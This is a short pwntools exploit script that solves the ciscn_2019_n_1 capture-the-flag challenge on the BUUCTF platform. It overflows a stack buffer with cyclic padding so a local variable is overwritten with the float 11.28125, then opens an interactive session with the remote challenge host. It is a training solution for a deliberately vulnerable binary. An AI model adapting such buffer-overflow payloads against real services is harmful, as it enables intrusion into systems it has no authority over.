from pwn import *

io = remote("node3.buuoj.cn",27086)

#io = process("./ciscn_2019_n_1")
#11.28125可以通过分析ida中的程序逻辑找到在内存中储存的十六进制数值。
payload = cyclic(0x30-0x4)+p64(0x41348000)

io.sendline(payload)

io.interactive()




